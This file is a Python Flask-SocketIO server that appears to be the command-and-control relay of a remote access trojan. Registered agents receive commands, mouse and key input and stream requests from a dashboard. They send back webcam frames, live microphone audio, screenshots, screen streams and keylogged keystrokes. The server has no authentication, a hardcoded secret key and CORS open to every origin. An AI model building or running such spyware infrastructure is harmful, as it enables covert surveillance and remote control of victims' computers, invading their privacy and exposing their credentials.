from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
from datetime import datetime
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'changeme123'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

clients = {}          # client_id -> info dict
agent_sids = {}       # client_id -> socket sid
dashboard_sids = set()

@app.route('/')
def index():
    return render_template('index.html')

# ── Agent events ─────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    pass

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    # Check if this was an agent
    for cid, csid in list(agent_sids.items()):
        if csid == sid:
            if cid in clients:
                clients[cid]['status'] = 'offline'
            del agent_sids[cid]
            broadcast_clients()
            break
    dashboard_sids.discard(sid)

@socketio.on('agent_register')
def handle_agent_register(data):
    cid = data.get('client_id', str(uuid.uuid4()))
    agent_sids[cid] = request.sid
    join_room(f'agent_{cid}')
    clients[cid] = {
        'id': cid,
        'hostname': data.get('hostname', 'Unknown'),
        'ip': request.remote_addr,
        'username': data.get('username', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'connected_at': data.get('connected_at', datetime.now().isoformat()),
        'last_seen': datetime.now().isoformat(),
        'status': 'online',
        'sid': request.sid,
    }
    broadcast_clients()

@socketio.on('dashboard_join')
def handle_dashboard_join():
    dashboard_sids.add(request.sid)
    join_room('dashboards')
    emit('client_update', {'clients': sanitized_clients()})

@socketio.on('request_clients')
def handle_request_clients():
    emit('client_update', {'clients': sanitized_clients()})

# ── Dashboard -> Agent relay ──────────────────────────────────

@socketio.on('cmd')
def handle_cmd(data):
    """Dashboard sends cmd, relay to specific agent."""
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('cmd', data, to=agent_sids[cid])
    else:
        emit('cmd_response', {'client_id': cid, 'rid': data.get('rid',''), 'status': 'error', 'msg': 'Agent not connected'})

@socketio.on('start_stream')
def handle_start_stream(data):
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('start_stream', data, to=agent_sids[cid])

@socketio.on('stop_stream')
def handle_stop_stream(data):
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('stop_stream', data, to=agent_sids[cid])

@socketio.on('mouse_move')
def handle_mouse_move(data):
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_move', data, to=agent_sids[cid])

@socketio.on('mouse_click')
def handle_mouse_click(data):
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_click', data, to=agent_sids[cid])

@socketio.on('key_press')
def handle_key_press(data):
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('key_press', data, to=agent_sids[cid])

# ── Agent -> Dashboard relay ──────────────────────────────────

@socketio.on('webcam_frame')
def handle_webcam_frame(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('webcam_frame', data, to='dashboards')

@socketio.on('mic_live_chunk')
def handle_mic_live_chunk(data):
    socketio.emit('mic_live_chunk', data, to='dashboards')

@socketio.on('mic_data')
def handle_mic_data(data):
    socketio.emit('mic_data', data, to='dashboards')

@socketio.on('auto_screenshot')
def handle_auto_screenshot(data):
    socketio.emit('auto_screenshot', data, to='dashboards')

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Agent sends frame, relay to all dashboards."""
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('screen_frame', data, to='dashboards')

@socketio.on('chat_reply')
def handle_chat_reply(data):
    socketio.emit('chat_reply', data, to='dashboards')

@socketio.on('keylog_data')
def handle_keylog_data(data):
    socketio.emit('keylog_data', data, to='dashboards')

@socketio.on('cmd_response')
def handle_cmd_response(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('cmd_response', data, to='dashboards')

# ── Helpers ───────────────────────────────────────────────────

def sanitized_clients():
    return [{k: v for k, v in c.items() if k != 'sid'} for c in clients.values()]

def broadcast_clients():
    socketio.emit('client_update', {'clients': sanitized_clients()}, to='dashboards')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
